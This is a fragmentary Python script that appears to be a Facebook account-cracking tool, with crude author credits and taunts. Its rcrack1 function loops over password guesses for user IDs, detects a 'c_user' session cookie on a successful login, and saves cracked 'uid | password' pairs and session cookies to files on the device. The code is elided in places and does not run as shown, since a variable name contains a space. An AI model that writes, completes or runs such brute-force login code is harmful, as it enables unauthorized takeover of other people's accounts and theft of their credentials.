#SC MAKED BY KING MIRAJ 🥰 and Fuked By FB-KING 🥰

#Tera pappa FB-KING 💋 KING MIRAJ
...
class Main:
    ...
    def __init__(self):
        ...
        KING MIRAJ =input(" [√] Choose : ")

        if KING MIRAJ in ["1", "01"]:

            v1()

        if KING MIRAJ in ["2", "02"]:

            v2()

        if KING MIRAJ in ["3","03"]:

            v3()

        if KING MIRAJ in [" 0", "00"]:
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mMiraj\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
    ...
    # 'cookie': 'datr=VE8cZGGvxeSXxIn_Z5VHgF7a; sb=VE8cZLKnwscyNjH9saYhX8-h',
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"\033[38;5;46m[KING MIRAJ-OK💛] {uid}|{ps}")

                print(f" \n Cookie : {coki}")

                print(f" \n ══════════════════════════════════════════")

                open('/sdcard/KING MIRAJ/ok.txt', 'a').write( uid+' | '+ps+'\n')
                ...
                print(f"\x1b[38;5;196m[KING MIRAJ-CP🔒] {uid}|{ps}")

                open('/sdcard/Pyscho-CP.txt', 'a').write( uid+' | '+ps+' \n')
        ...
        sys.stdout.write(f'\r\033[m[KING MIRAJ💉] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
